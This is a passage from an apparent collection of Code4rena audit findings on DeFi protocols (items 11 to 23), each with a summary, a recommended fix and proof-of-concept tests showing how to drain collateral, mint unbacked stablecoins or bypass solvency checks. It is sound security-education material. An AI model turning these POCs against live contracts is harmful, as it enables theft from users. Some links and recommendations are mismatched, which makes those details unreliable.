      const tokenAccount_amount2 = tokenAccount.amount;
      const userTokenAcc_amount2 = userTokenAcc.amount;
      console.log("Pos#1.collateral    : ", tokenAccount_amount2);
      console.log("Pos#2.collateral    : ", tokenAccount2.amount);
      console.log("Borrower Collateral : ", userTokenAcc_amount2);
      const node_balance2 = await provider.connection.getBalance(
        nodeWallet.publicKey
      );
      const user_balance2 = await provider.connection.getBalance(
        provider.publicKey
      );
      console.log("Node Sol            : ", node_balance2);
      console.log("Borrower Sol        : ", user_balance2);
    });
  });
  ```

  </details>

## 11.[High] Malicious borrowers will never repay loans with high interest

### calculate loan without interest

- Summary: The liquidation check does not consider accrued interest when calculating the Loan-to-Value (LTV) ratio. This allows borrowers to avoid repayment if the interest grows too much and the original borrowed amount’s LTV (without accrued interest) stays under 90%, leading to bad debt for lenders.

- Impact & Recommendation: Consider adding the owed interest to the total amount when performing the liquidation check.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-lavarage#h-03-malicious-borrowers-will-never-repay-loans-with-high-interest) & [Report](https://code4rena.com/reports/2024-04-lavarage)

  <details><summary>POC</summary>

  ```rust

  require!(ctx.accounts.position_account.amount * 1000 / position_size  > 900, FlashFillError::ExpectedCollateralNotEnough );

  ctx.accounts.position_account.amount = position_size - user_pays;

  ```

  </details>

## 12.[Medium] Failure to set settlePrices[] will prevent redemption of product

### Settlement

- Summary : The `settle()` function in both SpotOracle and HlOracle contracts records `settlePrices[]` but fails to set them properly if `settle()` is not executed on the day of settlement. This results in zero settlement prices, making expiring products un-redeemable for SmartTrend vaults and causing incorrect payouts for DNT vaults.

- Impact & Recommendation: Introduce a `latestExpiryUpdated` variable to track the last day settlement prices were updated.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-sofa-pro-league#m-04-failure-to-set-settleprices-will-prevent-redemption-of-product) & [Report](https://code4rena.com/reports/2024-04-lavarage)

  <details><summary>POC</summary>

  ```solidity
      function settle() public {
        uint256 expiry = block.timestamp - block.timestamp % 86400 + 28800;
        require(settlePrices[expiry] == 0, "Oracle: already settled");
        settlePrices[expiry] = uint256(getLatestPrice());
        emit Settled(expiry, settlePrices[expiry]);
    }

  ```

  </details>

## 13.[High] Withdrawals of rebasing tokens can lead to insolvency and unfair distribution of protocol reserves

### Rebasing tokens

- Summary: The current withdrawal mechanism for rebasing tokens like stETH can lead to users receiving a larger share of reserves than intended after a rebasing event, resulting in unfair distribution and potential transaction failures if the contract’s balance is insufficient to cover all pending withdrawals.

- Impact & Recommendation: To fix the unfair distribution of funds with rebasing tokens like stETH, the WithdrawQueue contract should handle withdrawals as stETH shares instead of fixed amounts. When a user withdraws, convert the amount to stETH shares and store this. Upon claiming, transfer the shares directly.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-renzo#h-05-withdrawals-of-rebasing-tokens-can-lead-to-insolvency-and-unfair-distribution-of-protocol-reserves) & [Report](https://code4rena.com/reports/2024-04-renzo)

  <details><summary>POC</summary>

  ```solidity
    pragma solidity ^0.8.19;
    import "contracts/Errors/Errors.sol";
    import "./Setup.sol";
    contract H6 is Setup {
        function testH6() public {
            // we set the buffer to something reasonably high
            WithdrawQueueStorageV1.TokenWithdrawBuffer[] memory buffers = new WithdrawQueueStorageV1.TokenWithdrawBuffer[](2);
            buffers[0] = WithdrawQueueStorageV1.TokenWithdrawBuffer(address(stETH), 100e18 - 1);
            buffers[1] = WithdrawQueueStorageV1.TokenWithdrawBuffer(address(cbETH), 100e18 - 1);
            vm.startPrank(OWNER);
            withdrawQueue.updateWithdrawBufferTarget(buffers);
            // we'll be using stETH and cbETH with unitary price for simplicity
            stEthPriceOracle.setAnswer(1e18);
            cbEthPriceOracle.setAnswer(1e18);
            // and we start with 0 TVL
            (, , uint tvl) = restakeManager.calculateTVLs();
            assertEq(0, tvl);
            // let's then imagine that Alice and Bob hold 90 and 10 ezETH each
            address alice = address(1234567890);
            address bob = address(1234567891);
            stETH.mint(alice, 100e18);
            vm.startPrank(alice);
            stETH.approve(address(restakeManager), 100e18);
            restakeManager.deposit(IERC20(address(stETH)), 100e18);
            ezETH.transfer(bob, 10e18);
            // ✅ TVL and balance are as expected
            (, , tvl) = restakeManager.calculateTVLs();
            assertEq(100e18, tvl);
            assertEq(90e18, ezETH.balanceOf(alice));
            assertEq(10e18, ezETH.balanceOf(bob));
            // Now Bob initiates withdrawal of their shares
            vm.startPrank(bob);
            ezETH.approve(address(withdrawQueue), 10e18);
            withdrawQueue.withdraw(10e18, address(stETH));
            // Alice, too, initiates withdrawal of their shares
            vm.startPrank(alice);
            ezETH.approve(address(withdrawQueue), 90e18 - 1);
            withdrawQueue.withdraw(90e18 - 1, address(stETH));
            // ☢️ time passes, and an stETH negative rebasing happens, wiping
            // 10% of the balance
            vm.startPrank(address(withdrawQueue));
            stETH.transfer(address(1), 10e18);
            vm.warp(block.timestamp + 10 days);
            // 🚨 now, since WithdrawQueue checked availability at withdrawal initiation
            // only and didn not account for the possibility of rebases, the 10% loss
            // has been completely dodged by Alice and is attributed to the last
            // user exiting.
            vm.startPrank(alice);
            withdrawQueue.claim(0);
            assertEq(90e18 - 1, stETH.balanceOf(alice));
            // 🚨 not only Bob can't withdraw
            vm.startPrank(bob);
            vm.expectRevert();
            withdrawQueue.claim(0);
            // 🚨 but ezETH as a whole also became completely uncollateralized
            assertEq(10e18 + 1, ezETH.totalSupply());
            (, , tvl) = restakeManager.calculateTVLs();
            assertEq(1, tvl);
        }
    }

  ```

  </details>

## 14.[High] Kerosene collateral is not being moved on liquidation, exposing liquidators to loss

### Collateral of liquidation

- Summary: Liquidators are not rewarded with `Kerosene` tokens because only assets from the `vaults` mapping are moved to liquidators during liquidation, leaving `Kerosene` tokens in the liquidated Note. This results in liquidators receiving less than expected, potentially incurring losses.

- Impact & Recommendation: To fix this, the `vaultsKerosene` mapping should also be included as a source of assets in the `liquidate` function. The proposed change adds code to transfer assets from `vaultsKerosene` to the liquidator, ensuring they receive the full expected collateral.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-dyad#h-09-kerosene-collateral-is-not-being-moved-on-liquidation-exposing-liquidators-to-loss) & [Report](https://code4rena.com/reports/2024-04-dyad)

  <details><summary>POC</summary>

  ```solidity
    contract VaultManagerTest is VaultManagerTestHelper {
        Kerosine keroseneV2;
        Licenser vaultLicenserV2;
        VaultManagerV2 vaultManagerV2;
        Vault ethVaultV2;
        VaultWstEth wstEthV2;
        KerosineManager kerosineManagerV2;
        UnboundedKerosineVault unboundedKerosineVaultV2;
        BoundedKerosineVault boundedKerosineVaultV2;
        KerosineDenominator kerosineDenominatorV2;
        OracleMock wethOracleV2;
        address bob = makeAddr("bob");
        address alice = makeAddr("alice");
        ERC20 wrappedETH = ERC20(MAINNET_WETH);
        ERC20 wrappedSTETH = ERC20(MAINNET_WSTETH);
        DNft dNFT = DNft(MAINNET_DNFT);
        function setUpV2() public {
            (Contracts memory contracts, OracleMock newWethOracle) = new DeployV2().runTestDeploy();
            keroseneV2 = contracts.kerosene;
            vaultLicenserV2 = contracts.vaultLicenser;
            vaultManagerV2 = contracts.vaultManager;
            ethVaultV2 = contracts.ethVault;
            wstEthV2 = contracts.wstEth;
            kerosineManagerV2 = contracts.kerosineManager;
            unboundedKerosineVaultV2 = contracts.unboundedKerosineVault;
            boundedKerosineVaultV2 = contracts.boundedKerosineVault;
            kerosineDenominatorV2 = contracts.kerosineDenominator;
            wethOracleV2 = newWethOracle;
            vm.startPrank(MAINNET_OWNER);
            Licenser(MAINNET_VAULT_MANAGER_LICENSER).add(address(vaultManagerV2));
            boundedKerosineVaultV2.setUnboundedKerosineVault(unboundedKerosineVaultV2);
            vm.stopPrank();
        }
        function test_NonKeroseneNotMovedOnLiquidate() public {
            setUpV2();
            deal(MAINNET_WETH, bob, 100e18);
            deal(MAINNET_WSTETH, alice, 100e18);
            deal(MAINNET_WETH, address(ethVaultV2), 10_000e18);
            vm.prank(MAINNET_OWNER);
            keroseneV2.transfer(bob, 100e18);
            uint256 bobNFT = dNFT.mintNft{value: 1 ether}(bob);
            uint256 aliceNFT = dNFT.mintNft{value: 1 ether}(alice);
            // Bob adds Weth vault and Bounded Kerosene vault to his NFT
            // Bob deposits 1 Weth and 1 Kerosene
            // Bob mints 2,100 Dyad
            vm.startPrank(bob);
            wrappedETH.approve(address(vaultManagerV2), type(uint256).max);
            keroseneV2.approve(address(vaultManagerV2), type(uint256).max);
            vaultManagerV2.addKerosene(bobNFT, address(boundedKerosineVaultV2));
            vaultManagerV2.add(bobNFT, address(ethVaultV2));
            vaultManagerV2.deposit(bobNFT, address(boundedKerosineVaultV2), 1e18);
            vaultManagerV2.deposit(bobNFT, address(ethVaultV2), 1e18);
            vaultManagerV2.mintDyad(bobNFT, 2_100e18, bob);
            vm.stopPrank();
            // Alice adds WstEth vault and Weth vault to her NFT
            // Alice deposits 1.3 WstEth
            // Alice mints 3,000 Dyad
            vm.startPrank(alice);
            wrappedSTETH.approve(address(vaultManagerV2), type(uint256).max);
            vaultManagerV2.addKerosene(aliceNFT, address(boundedKerosineVaultV2));
            vaultManagerV2.add(aliceNFT, address(wstEthV2));
            vaultManagerV2.add(aliceNFT, address(ethVaultV2));
            vaultManagerV2.deposit(aliceNFT, address(wstEthV2), 1.3e18);
            vaultManagerV2.mintDyad(aliceNFT, 3_000e18, alice);
            vm.stopPrank();
            // Bob not liquidatable
            assertGt(vaultManagerV2.collatRatio(bobNFT), vaultManagerV2.MIN_COLLATERIZATION_RATIO());
            // Weth price drops down
            wethOracleV2.setPrice(wethOracleV2.price() / 2);
            // Bob liquidatable
            assertLt(vaultManagerV2.collatRatio(bobNFT), vaultManagerV2.MIN_COLLATERIZATION_RATIO());
            // Bob's position collateral ratio is less than 100% => All collateral should be moved
            assertLt(vaultManagerV2.collatRatio(bobNFT), 1e18);
            // Alice liquidates Bob's position
            vm.prank(alice);
            vaultManagerV2.liquidate(bobNFT, aliceNFT);
            // Bob loses all non-Kerosene collateral, but keeps Kerosene collateral
            assertEq(vaultManagerV2.getNonKeroseneValue(bobNFT), 0);
            assertGt(vaultManagerV2.getKeroseneValue(bobNFT), 0);
        }
    }

  ```

  </details>

## 15.[High] Users can mint DUSD with less collateral than required, which gives them free DUSD and may open a liquidatable position

### Mint with less collateral

- Summary: A vulnerability in the DittoETH protocol allows users to mint more DUSD than the collateral they provide by exploiting the `LibOrders.sol` contract, which mints excess DUSD, causes price manipulation, and creates liquidatable positions. When canceling a short order, the protocol incorrectly calculates the required collateral using the short order’s collateral ratio and price, leading to potential under-collateralization. An attacker can exploit this by creating short orders with less than 100% capital, ensuring partial fills, and then canceling to mint DUSD with insufficient collateral. This creates a position that is immediately liquidatable.

- Impact & Recomemdation: Mitigation involves using the initial collateral ratio and current oracle price for accurate collateral calculations and ensuring sufficient collateral before allowing cancellation.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-dittoeth#h-03-users-can-mint-dusd-with-less-collateral-than-required-which-gives-them-free-dusd-and-may-open-a-liquidatable-position) & [Report](https://code4rena.com/reports/2024-03-dittoeth)

<details><summary>POC</summary>

```solidity
// Make sure to import the types below into the Shorts.t.sol file
    // import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";
    function test_MintFreeDUSD() public {
        // set the initial, penalty and liquidation CRs
        vm.startPrank(owner);
        // set below 200 to allow shorter provide less than 100% of debt
        diamond.setInitialCR(asset, 170);
        diamond.setPenaltyCR(asset, 120);
        diamond.setLiquidationCR(asset, 150);
        vm.stopPrank();
        // create a bid to match the short and change its state to SR.PartialFill
        fundLimitBidOpt(1 ether, 0.01 ether, receiver);
        // create the short providing only 70% of the dusd to be minted
        uint88 price = 1 ether;
        depositEth(sender, price.mulU88(5000 ether).mulU88(0.7 ether));
        uint16[] memory shortHintArray = setShortHintArray();
        MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
        vm.prank(sender);
        diamond.createLimitShort(asset, uint80(price), 5000 ether, orderHintArray, shortHintArray, 70);
        STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
        // successfully matches the bid
        assertTrue(short.status == SR.PartialFill);

        // cancel the short to use up collateral provided and mint dusd
        vm.prank(sender);
        cancelShort(101);
        short = getShortRecord(sender, C.SHORT_STARTING_ID);
        assertEq(short.ercDebt, 2000 ether); // 2000 dusd minted
        assertEq(short.collateral, 0.01 ether + 0.7 * 2000 ether); // 70% of ETH collateral provided
        // this SR is liquidatable
        assertGt( diamond.getAssetNormalizedStruct(asset).liquidationCR, short.collateral.div(short.ercDebt.mul(1 ether)));
    }
    function test_MintBelowPrice() public {
        // create a bid to match the short and change its state to SR.PartialFill
        fundLimitBidOpt(1 ether, 0.01 ether, receiver);
        // create the short providing 400% of the dusd to be minted
        // current initialCR is 500%
        uint88 price = 1 ether;
        depositEth(sender, price.mulU88(5000 ether).mulU88(4 ether));
        uint16[] memory shortHintArray = setShortHintArray();
        MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
        vm.prank(sender);
        diamond.createLimitShort(asset, uint80(price), 5000 ether, orderHintArray, shortHintArray, 400);
        STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
        assertTrue(short.status == SR.PartialFill); // CR is partially filled by bid

        // set the new price to 1.5 ether so that price increase
        uint256 newPrice = 1.5 ether;
        skip(15 minutes);
        ethAggregator.setRoundData(
            92233720368547778907 wei, int(newPrice.inv()) / ORACLE_DECIMALS, block.timestamp, block.timestamp, 92233720368547778907 wei
        );
        fundLimitBidOpt(1 ether, 0.01 ether, receiver);
        assertApproxEqAbs(diamond.getProtocolAssetPrice(asset), newPrice, 15000000150);
        // cancel the short to mint at 1 ether instead of 1.5 ether
        vm.prank(sender);
        cancelShort(101);
        short = getShortRecord(sender, C.SHORT_STARTING_ID);
        assertEq(short.ercDebt, 2000 ether); // 2000 dusd minted
        // 2000 dusd minted for 8000 ether (400% at price of 1 ether)
        // instead of 12000 ether (400% at price of 1.5 ether)
        assertEq(short.collateral, 0.01 ether + 4*2000 ether);
        // position is liquidatable
        assertGt( diamond.getAssetNormalizedStruct(asset).liquidationCR, short.collateral.div(short.ercDebt.mul(1.5 ether)));
    }

```

</details>

## 16.[High] When harvesting a strategy and adjusting the debt, all the leftover collateral that is not used to swap the withdrawn collateral from Aave for WETH to repay the flashloan will be locked and lost in the Strategy contract

### Hardcode fee and self transfer collateral

- Summary: During the strategy harvesting and debt adjustment process, leftover collateral can get locked and lost in the Strategy contract. This occurs due to issues in computing the collateral needed for flashloan repayment and performing swaps.

- Impact & Recommendation: Use the configured pool fee (swapFeeTier) instead of hardcoding the value when calling UniQuoter. Resupply leftover collateral to Aave instead of self-transferring it.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-bakerfi#h-03-when-harvesting-a-strategy-and-adjusting-the-debt-all-the-leftover-collateral-that-is-not-used-to-swap-the-withdrawn-collateral-from-aave-for-weth-to-repay-the-flashloan-will-be-locked-and-lost-in-the-strategy-contract) & [Report](https://code4rena.com/reports/2024-05-bakerfi)

<details><summary>POC</summary>

```solidity
    function _swap(
        ISwapHandler.SwapParams memory params
    ) internal override returns (uint256 amountOut) {
        ...
        // Exact Input
        if (params.mode == ISwapHandler.SwapType.EXACT_INPUT) {
            ...
            // Exact Output
        } else if (params.mode == ISwapHandler.SwapType.EXACT_OUTPUT) {
          //@audit-info => Does an EXACT_OUTPUT swap
          //@audit-info => `amountIn` represents the exact amount of collateral that was required to swap the requested amount of WETH to repay the flashloan!
            uint256 amountIn = _uniRouter.exactOutputSingle(
                IV3SwapRouter.ExactOutputSingleParams({
                    tokenIn: params.underlyingIn,
                    tokenOut: params.underlyingOut,
                    fee: fee,
                    recipient: address(this),
                    amountOut: params.amountOut,
                    amountInMaximum: params.amountIn,
                    sqrtPriceLimitX96: 0
                })
            );

          //@audit-issue => Self transfering the leftover collateral after the swap. This leftover collateral will be left in the Strategy's balance, causing it to be unnusable.
            if (amountIn < params.amountIn) {
                IERC20(params.underlyingIn).safeTransfer(address(this), params.amountIn - amountIn);
            }

            ...
        }
    }

```

</details>

## 17.[Medium] All supplied WETH to Aave as a deposit by a Strategy will be irrecoverable

### Cannot withdraw WETH

- Summary: All WETH deposited by the Strategy into Aave will be lost, as the Strategy cannot withdraw WETH from Aave. Any leftover WETH deposited back into Aave by the Strategy will be irrecoverable.

- Impact & Recommendation: Instead of supplying leftover WETH to Aave, use it to repay more WETH debt on Aave. This prevents WETH from being lost and improves the loan-to-value ratio.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-bakerfi#m-01-all-supplied-weth-to-aave-as-a-deposit-by-a-strategy-will-be-irrecoverable) & [Report](https://code4rena.com/reports/2024-05-bakerfi)

<details><summary>POC</summary>

```solidity
    function _payDebt(uint256 debtAmount, uint256 fee) internal {
      ...
      //@audit-info => output represents the received amount of WETH for the swap
      uint256 output = _swap(
          ISwapHandler.SwapParams(
              ierc20A(),
              wETHA(),
              ISwapHandler.SwapType.EXACT_OUTPUT,
              amountIn,
              debtAmount + fee,
              _swapFeeTier,
              bytes("")
          )
      );
      //@audit-info => Checks if there are any WETH leftovers
      // When there are leftovers from the swap, deposit then back
      uint256 wethLefts = output > (debtAmount + fee) ? output - (debtAmount + fee) : 0;
      //@audit-issue => If any leftover WETH, it deposits them onto Aave!
      //@audit-issue => Once the WETH is deposited in Aave, the Strategy won't be able to pull it out.
      if (wethLefts > 0) {
          _supply(wETHA(), wethLefts);
      }
      emit StrategyUndeploy(msg.sender, debtAmount);
    }

```

</details>

## 18.[Medium] `_validatePositionList()` does not check for duplicate tokenIds, allowing attackers to bypass solvency checks

### Bypass solvency checks

- Summary: The `_validatePositionList` function in the `PanopticPool` contract does not check for duplicate `tokenIds`, allowing attackers to bypass solvency checks. This results in potential insolvency issues.

- Impact & Recommendation: Add a check in `_validatePositionList` to ensure the length is shorter than `MAX_POSITIONS` .
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-panoptic#m-02-_validatepositionlist-does-not-check-for-duplicate-tokenids-allowing-attackers-to-bypass-solvency-checks) & [Report](https://code4rena.com/reports/2024-04-panoptic)

<details><summary>POC</summary>

```solidity

    function test_duplicatePositionHash(
        uint256 x,
        uint256[2] memory widthSeeds,
        int256[2] memory strikeSeeds,
        uint256[2] memory positionSizeSeeds,
        uint256 swapSizeSeed
    ) public {
        _initPool(x);
        (int24 width, int24 strike) = PositionUtils.getOTMSW(
            widthSeeds[0],
            strikeSeeds[0],
            uint24(tickSpacing),
            currentTick,
            0
        );
        (int24 width2, int24 strike2) = PositionUtils.getOTMSW(
            widthSeeds[1],
            strikeSeeds[1],
            uint24(tickSpacing),
            currentTick,
            0
        );
        vm.assume(width2 != width || strike2 != strike);
        populatePositionData([width, width2], [strike, strike2], positionSizeSeeds);
        // leg 1
        TokenId tokenId = TokenId.wrap(0).addPoolId(poolId).addLeg(
            0, 1, isWETH, 0, 0, 0, strike, width
        );
        TokenId[] memory posIdList = new TokenId[](257);
        for (uint i = 0; i < 257; ++i) {
            posIdList[i] = tokenId;
        }
        pp.mintOptions(posIdList, positionSizes[0], 0, 0, 0);
    }

```

</details>

## 19.[Medium] checkpoint function is not called before staking which can cause loss of rewards for already staked services

### Update the availableRewards

- Summary: The `checkpoint` function is not called before staking in the contract, which can lead to a loss of rewards for previously staked services. When a new service ID is staked without calling `checkpoint`, rewards are not distributed correctly, causing existing stakers to receive less than they should. For example, if rewards are not updated before a new stake is added, the total available rewards may be divided incorrectly among more services, reducing the rewards for earlier stakers.

- Impact & Recommendation: The `checkpoint` function should be called at the start of the `stake` function to ensure that rewards are distributed correctly before allowing new stakes.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-olas#m-01-checkpoint-function-is-not-called-before-staking-which-can-cause-loss-of-rewards-for-already-staked-services) & [Report](https://code4rena.com/reports/2024-05-olas)

<details><summary>POC</summary>

```solidity

function stake(uint256 serviceId) external {
==>         checkpoint();
        // Check if there available rewards
        if (availableRewards == 0) {
            revert NoRewardsAvailable();
        }
        // Check if the evicted service has not yet unstaked
        ServiceInfo storage sInfo = mapServiceInfo[serviceId];
        // tsStart being greater than zero means that the service was not yet unstaked: still staking or evicted
        if (sInfo.tsStart > 0) {
            revert ServiceNotUnstaked(serviceId);
        }
        // Check for the maximum number of staking services
        uint256 numStakingServices = setServiceIds.length;
        if (numStakingServices == maxNumServices) {
            revert MaxNumServicesReached(maxNumServices);
        }
        // Check the service conditions for staking
        IService.Service memory service = IService(serviceRegistry).getService(serviceId);
        // Check the number of agent instances
        if (numAgentInstances != service.maxNumAgentInstances) {
            revert WrongServiceConfiguration(serviceId);
        }
        // Check the configuration hash, if applicable
        if (configHash != 0 && configHash != service.configHash) {
            revert WrongServiceConfiguration(serviceId);
        }
        // Check the threshold, if applicable
        if (threshold > 0 && threshold != service.threshold) {
            revert WrongServiceConfiguration(serviceId);
        }
        // The service must be deployed
        if (service.state != IService.ServiceState.Deployed) {
            revert WrongServiceState(uint256(service.state), serviceId);
        }
        // Check that the multisig address corresponds to the authorized multisig proxy bytecode hash
        bytes32 multisigProxyHash = keccak256(service.multisig.code);
        if (proxyHash != multisigProxyHash) {
            revert UnauthorizedMultisig(service.multisig);
        }
        // Check the agent Ids requirement, if applicable
        uint256 size = agentIds.length;
        if (size > 0) {
            uint256 numAgents = service.agentIds.length;
            if (size != numAgents) {
                revert WrongServiceConfiguration(serviceId);
            }
            for (uint256 i = 0; i < numAgents; ++i) {
                // Check that the agent Ids
                if (agentIds[i] != service.agentIds[i]) {
                    revert WrongAgentId(agentIds[i]);
                }
            }
        }
        // Check service staking deposit and token, if applicable
        _checkTokenStakingDeposit(serviceId, service.securityDeposit, service.agentIds);
        // ServiceInfo struct will be an empty one since otherwise the safeTransferFrom above would fail
        sInfo.multisig = service.multisig;
        sInfo.owner = msg.sender;
        // This function might revert if it's incorrectly implemented, however this is not a protocol's responsibility
        // It is safe to revert in this place
        uint256[] memory nonces = IActivityChecker(activityChecker).getMultisigNonces(service.multisig);
        sInfo.nonces = nonces;
        sInfo.tsStart = block.timestamp;
        // Add the service Id to the set of staked services
        setServiceIds.push(serviceId);
        // Transfer the service for staking
        IService(serviceRegistry).safeTransferFrom(msg.sender, address(this), serviceId);
        emit ServiceStaked(epochCounter, serviceId, msg.sender, service.multisig, nonces);
    }

```

</details>

## 20.[High] Liquidators can bypass remaining negative margin check and leave the loss to the protocol

### Negative margin check

- Summary: The vulnerability allows liquidators to profit at the expense of the protocol by nearly closing a position and bypassing the negative margin check, which leaves the protocol with the loss; this occurs because the current code only checks for negative margin if the position is fully closed.

- Impact & Recommendation: The suggested fix involves checking for negative margin even when the position is not fully closed.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-predy#h-02-liquidators-can-bypass-remaining-negative-margin-check-and-leave-the-loss-to-the-protocol) & [Report](https://code4rena.com/reports/2024-05-predy)

<details><summary>POC</summary>

```solidity
if (!hasPosition) {
    int256 remainingMargin = vault.margin;
    if (remainingMargin > 0) {
        if (vault.recipient != address(0)) {
            // Send the remaining margin to the recipient.
            vault.margin = 0;
            sentMarginAmount = uint256(remainingMargin);
            ERC20(pairStatus.quotePool.token).safeTransfer(vault.recipient, sentMarginAmount);
        }
    }
}
else{
    if (remainingMargin < 0) {
        vault.margin = 0;
        // To prevent the liquidator from unfairly profiting through arbitrage trades in the AMM and passing losses onto the protocol,
        // any losses that cannot be covered by the vault must be compensated by the liquidator
        ERC20(pairStatus.quotePool.token).safeTransferFrom(msg.sender, address(this), uint256(-remainingMargin));
    }
}

```

</details>

## 21.[High] Liquidation incorrectly tries to transfer token from Market instead of liquidator if remainingMargin is negative

### Transfer tokens from the Market contract instead of the liquidator

- Summary: The Predy protocol has a critical flaw in its liquidation process where, if a vault's position is fully liquidated and results in a negative margin (bad debt), the code incorrectly tries to transfer tokens from the Market contract instead of the liquidator. This mistake makes it impossible to clear the bad debt, causing it to accumulate continuously. The issue arises because the `safeTransferFrom` function is called on the Market protocol (msg.sender) instead of the liquidator, leading to failed transactions since the Market contract doesn't have the necessary token allowance.

- Impact & Recommendation: The recommended fix is to transfer tokens directly from the liquidator to cover the bad debt.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-predy#h-04-Liquidation-incorrectly-tries-to-ransfer-token-from-Market-instead-of-liquidator-if-remainingMargin-is-negative) & [Report](https://code4rena.com/reports/2024-05-predy)
  <br> others:[Source](<https://code4rena.com/reports/2024-04-gondi#h-05-triggerFee-is-stolen-from-other-auctions-during-settleWithBuyout()>) & [Report](https://code4rena.com/reports/2024-04-gondi)

<details><summary>POC</summary>

```solidity

function liquidate(
        uint256 vaultId,
        uint256 closeRatio,
        GlobalDataLibrary.GlobalData storage globalData,
        bytes memory settlementData
    ) external returns (IPredyPool.TradeResult memory tradeResult) {
        ...
        if (!hasPosition) {
            int256 remainingMargin = vault.margin;
            if (remainingMargin > 0) {
                if (vault.recipient != address(0)) {
                    // Send the remaining margin to the recipient.
                    vault.margin = 0;
                    sentMarginAmount = uint256(remainingMargin);
                    ERC20(pairStatus.quotePool.token).safeTransfer(vault.recipient, sentMarginAmount);
                }
            } else if (remainingMargin < 0) {
                vault.margin = 0;
>               // To prevent the liquidator from unfairly profiting through arbitrage trades in the AMM and passing losses onto the protocol,
>               // any losses that cannot be covered by the vault must be compensated by the liquidator
>               ERC20(pairStatus.quotePool.token).safeTransferFrom(msg.sender, address(this), uint256(-remainingMargin));
            }
        }
        ...
    }

```

</details>

## 22.[High] OraclePoolOfferHandler’s \_getFactors allows exact tokenId offer terms to be used for collection offers. A borrower can take on a loan with incorrect terms

### Inconsistent conditional checks for loan offers.

- Summary: The OraclePoolOfferHandler in `MultiSourceLoan.sol` has a high-risk vulnerability due to inconsistent conditional checks for loan offers. The `_getFactors` function and `_checkValidators` function use opposite criteria to validate collection offers versus exact token ID offers. This discrepancy allows a borrower to exploit the system by validating an exact token ID offer as a collection offer, or vice versa, leading to incorrect loan terms. For example, a borrower can use a cheaper token as collateral but receive a higher loan amount intended for a more expensive token, resulting in unfair loans that disadvantage lenders.

- Impact & Recommendation: The recommended fix is to swap the if conditions in `_getFactors()` to align with `_checkValidators()`.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-gondi#h-02-OraclePoolOfferHandler’s-_getFactors-allows-exact-tokenId-offer-terms-to-be-used-for-collection-offers.-A-borrower-can-take-on-a-loan-with-incorrect-terms) & [Report](https://code4rena.com/reports/2024-06-gondi)

<details><summary>POC</summary>

```solidity

    function _getFactors(
        address _collateralAddress,
        uint256 _collateralTokenId,
        uint256 _duration,
        IBaseLoan.OfferValidator[] memory _validators
    ) private view returns (PrincipalFactors memory) {
        bytes32 key;
        if (_validators.length == 0) {
            key = _hashKey(_collateralAddress, uint96(_duration), "");
        } else if (_validators.length == 1 && _isZeroAddress(_validators[0].validator)) {
            PrincipalFactorsValidationData memory validationData =
                abi.decode(_validators[0].arguments, (PrincipalFactorsValidationData));
            if (validationData.code == 1) {
                // Range
                (uint256 min, uint256 max) = abi.decode(validationData.data, (uint256, uint256));
                if (_collateralTokenId < min && _collateralTokenId > max) {
                    revert InvalidInputError();
                }
                key = _hashKey(_collateralAddress, uint96(_duration), validationData.data);
            } else if (validationData.code == 2) {
                // MerkleRoot
                (bytes32[] memory proof, bytes32 root) = abi.decode(validationData.data, (bytes32[], bytes32));
                bytes32 leaf = keccak256(abi.encodePacked(_collateralTokenId));
                MerkleProofLib.verify(proof, root, leaf);
                key = _hashKey(_collateralAddress, uint96(_duration), abi.encodePacked(root));
            } else if (validationData.code == 3) {
                // Individual
                uint256 tokenId = abi.decode(validationData.data, (uint256));
                if (_collateralTokenId != tokenId) {
                    revert InvalidInputError();
                }
                key = _hashKey(_collateralAddress, uint96(_duration), validationData.data);
            } else {
                revert InvalidInputError();
            }
        }
        return _principalFactors[key];
    }

```

</details>

## 23.[High] Attacker can profit from discount fees

### Discount fees proportionate to the entire debt

- Summary: An attacker can exploit the discount fee mechanism to profit more from the fees than the loss incurred by the discount trade. This occurs because the discount fee is proportionate to the entire debt, not the amount traded at a discount. Consequently, by triggering a discount and having a significant stake in the yDUSD vault, an attacker can receive more dUSD in fees than they lose from the trade.

- Impact & Recommendation: Fees minted should not exceed the implied trade loss.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-07-dittoeth#h-01-Attacker-can-profit-from-discount-fees) & [Report](https://code4rena.com/reports/2024-07-dittoeth)

<details><summary>POC</summary>

```solidity

function test_discount_drain() public {
    // Deal some dUSD to users, the attacker and dilutors.
    address users = makeAddr("users");
    address attacker = makeAddr("attacker");
    address dilutors = makeAddr("dilutors");
    vm.startPrank(_diamond);
    token.mint(users, 1_000_000 ether);
    token.mint(attacker, 1_500_000 ether);
    token.mint(dilutors, 10_000_000 ether);
    uint256 attackerInitialAssets = token.balanceOf(attacker);
    assertEq(token.balanceOf(attacker), 1_500_000 ether);
    // Set up some debt in the system
    fundLimitBidOpt(DEFAULT_PRICE, ERCDEBTSEED, receiver);
    fundLimitShortOpt(DEFAULT_PRICE, ERCDEBTSEED, extra);
    vm.prank(attacker);
    diamond.depositAsset(asset, 500_000 ether); // The attacker needs to escrow for his ask.

    STypes.ShortRecord memory tappSR = getShortRecord(tapp, C.SHORT_STARTING_ID);
    uint104 ercDebtMinusTapp = diamond.getAssetStruct(asset).ercDebt - tappSR.ercDebt;
    assertEq(ercDebtMinusTapp, 50_000_000 ether);
    assertEq(diamond.getAssetStruct(asset).lastDiscountTime, 0);
    assertEq(diamond.getAssetStruct(asset).initialDiscountTime, 1 seconds);
    // Let's say the yDUSD vault is already in use before the attack, with 1_000_000 ether dUSD already deposited.
    vm.startPrank(users);
